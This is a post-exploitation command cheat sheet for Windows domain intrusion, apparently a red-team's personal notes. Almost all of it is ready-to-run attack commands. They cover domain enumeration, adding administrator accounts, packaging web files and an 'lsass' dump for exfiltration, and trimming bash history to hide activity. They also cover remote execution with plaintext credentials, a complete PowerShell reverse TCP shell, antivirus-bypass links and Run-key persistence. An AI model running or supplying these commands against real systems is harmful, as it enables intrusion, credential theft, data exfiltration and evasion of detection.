# scan
```command
```



# Domain control
```command
net user
net user /domain
net group /domain
net view /domain
net group "domain admins" /domain
net localgroup administrators /domain
net user username password /add /domain
net time /domain
net view /domain
net localgroup administrators workgroup\test123 /add
net group "domain controllers" /domain

dsquery computer
dsquery contact
dsquery group
dsquery user
dsquery subnet
dsquery server
```

# information package
```command
7z.exe -r -v6m -padmin a c:\test.7z C:\AppServ\www\import*.*
7z.exe x -padmin test.7z.001 -oc:\xl

Rar.exe a -r -v6m -padmin -m3 -x*.txt -ta c:\test.rar C:\AppServ\www\import*.*
Rar.exe x -padmin c:\test.part01.rar c:\xl

makecab /d compressiontype=lzx C:\Users\lsass.txt C:\Users\lsass.cab >> C:\Users\info.txt
expand.exe lsass.cab -f:* .
```

# log clear
```command
wc -l ~/.bash_history
sed -i '73,$d' ~/.bash_history
tail -10f ~/.bash_history
```

# remote execute
```command
wmic /node:192.168.1.1 /user:administrator /password:"passwd" /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
wmic /node:192.168.1.1 /user:administrator /password:"passwd" os get Caption,OSArchitecture,Version
wmic /node:192.168.1.1 /user:administrator /password:"passwd" product list brief |more
wmic /node:192.168.1.1 /user:administrator /password:"passwd" process list brief |more
wmic /node:192.168.1.1 /user:administrator /password:"passwd" startup list brief |more
wmic /node:192.168.1.1 /user:administrator /password:"passwd" process where name="test.exe" call terminate

schtasks /create /s 172.10.1.1 /u administrator /p "passwd" /ru SYSTEM /tn test /sc DAILY /tr "C:\Users\hacker.exe -a -b c" /F & schtasks /run /s 172.10.1.1 /u administrator /p "passwd" /tn test /i & schtasks /delete /s 172.10.1.1 /u administrator /p "passwd" /tn test /f
python psexec.py test:passwdtest@10.10.1.1 cmd
python wmiexec.py test:passwdtest@10.10.1.1
Psexec.exe \\10.10.1.1 -u test -p passwdtest cmd
```

# powershell
```command
change file time
powershell.exe -command "Get-ChildItem -Path C:\ -Recurse –Include .txt,.doc,.xls,.pdf,.ppt,.docx,.xlsx,.pptf,.csv,.lnk | Where-Object { $.LastWriteTime -ge '02/01/2019 00:00:00' -AND $.LastWriteTime -le '10/27/2022 00:00:00'} | Copy-Item -Force -Destination C:\Users"

write file
powershell.exe -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("......")) | Set-Content testfoo.txt"

reverse tcp shell
nc -lvp 6666
powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('192.168.10.139',6666);$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# BypassAV
<https://github.com/TideSec/BypassAntiVirus>
<https://github.com/clinicallyinane/shellcode_launcher/>
<https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html>


# Persistence
```command
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v test /t REG_SZ /d "rundll32.exe "C:\Users\test\test.dll" Test"
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "test" /f
```
